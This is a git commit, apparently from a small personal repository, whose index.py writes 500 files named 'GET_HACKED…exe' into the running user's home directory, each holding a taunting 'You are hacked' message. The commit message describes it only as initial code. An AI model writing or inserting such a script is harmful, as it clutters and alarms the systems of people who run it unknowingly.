1a7ba819ca28afc154dd1887ce48a2b1fa265af1
Eli Sterken <eli.sterken@outlook.com>
2025-01-21 19:58:14 -0800

    Added Inital Code
    Added the inital code for version 1.0.0

---
+++ index.py
@@ -0,0 +1,7 @@
+import os
+
+fileNumber = 500
+
+for i in range(fileNumber):
+    with open(f"{os.path.expanduser('~')}/GET_HACKED010101001110101001001{i}.exe", "w") as file:
+        file.write("You are hacked bozo!\nlollollol")    
